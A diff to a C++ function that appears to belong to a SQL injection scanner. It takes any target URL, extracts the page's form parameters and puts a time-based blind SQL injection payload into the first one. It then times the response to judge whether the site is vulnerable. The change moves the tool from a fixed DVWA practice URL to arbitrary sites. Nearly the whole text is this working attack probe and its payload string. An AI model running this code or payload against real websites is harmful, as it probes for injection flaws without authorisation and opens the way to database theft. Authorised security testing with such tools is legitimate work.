@@ -5,68 +5,74 @@
 #include <curl/curl.h>
 #include <sstream>
 #include <chrono>
+#include <tuple>
 #include "functions.h"
+using namespace std;
 // Callback function to store response data
 
-void timebased()
+void timebased(string url)
 {
-    CURL *curl = curl_easy_init();
-    if (!curl)
-    {
-        std::cerr << "Failed to initialize curl\n";
-        return ;
-    }
+
     int testingtime=25;
-    std::string payload="'XOR(if(now()=sysdate(),sleep("+std::to_string(testingtime)+"),0))OR'";
-    std::string fixedpayload="&Submit=Submit";
+    std::string payload="'XOR(if(now()=sysdate(),sleep("+to_string(testingtime)+"),0))OR'";
     std::string successmessage="exists";
     std::string errormessage="MISSING";
     bool vulnerable=false;
 
     std::string response;
 
-    std::string url = "http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=" +payload+fixedpayload;
-    std::cout << url <<"\n";
+    cout << "Performing time based SQL injection\n";
 
-    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    response=sendHttpRequest(url);
+    std::vector<std::tuple<std::string, std::string, std::string>> params = extract_parameters(response);
 
-    curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
-    curl_easy_setopt(curl, CURLOPT_HEADER, 1);
+    std::string url1=url;
+    url1+="?";
+    int cnt=1;
+    for (const auto& param : params)
+    {
+        // std::cout <<"Enter the value of " <<get<0>(param) << "\n";
+        std::string para="";
+        if(cnt==1)
+        {
+            url1+=get<0>(param)+"="+payload;
+            cnt++;
+        }
+        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
+        {
+            url1+="&"+get<0>(param)+"="+get<2>(param);
+        }
+        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
+        {
+            url1+="&"+get<0>(param)+"="+"Submit";
+        }
+        else
+        {
+            url1+="&"+get<0>(param)+"="+para;
+            cnt++;
+        }
+    }
+    std::cout << url1 << "\n";
+
+
     auto start_time= std::chrono::high_resolution_clock::now();
-    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-    CURLcode res = curl_easy_perform(curl);
+    response=sendHttpRequest(url1);
+
     auto end_time= std::chrono::high_resolution_clock::now();
     auto duration= std::chrono::duration_cast<std::chrono::milliseconds>(end_time-start_time);
     long long int time=duration.count();
     std::cout <<"Time taken: "<<time<<"miliseconds"<< std::endl;
-    if (res != CURLE_OK)
-    {
-        std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
-        curl_easy_cleanup(curl);
-        return ;
-    }
-
-    if (response.empty())
-    {
-        std::cerr << "Empty response data\n";
-    }
 
     //std::cout << "Response: " << response << "\n";
     if(time<=(testingtime+1)*1000L&&time>=(testingtime-1)*1000L)
     {
         vulnerable=true;
     }
-
-
-
-    curl_easy_cleanup(curl);
     if(vulnerable)
     {
-        std::cout << "The website is vulnerable to Timebased SQL injection\n";
+        std::cout << "The website is vulnerable to Timebased SQL injection\n\n";
     }
-    else std::cout << "The website is not vulnerable to Timebased SQL injection.Sorry we can not do any further work\n";
+    else std::cout << "The website is not vulnerable to Timebased SQL injection.Sorry we can not do any further work\n\n";
 
 
 
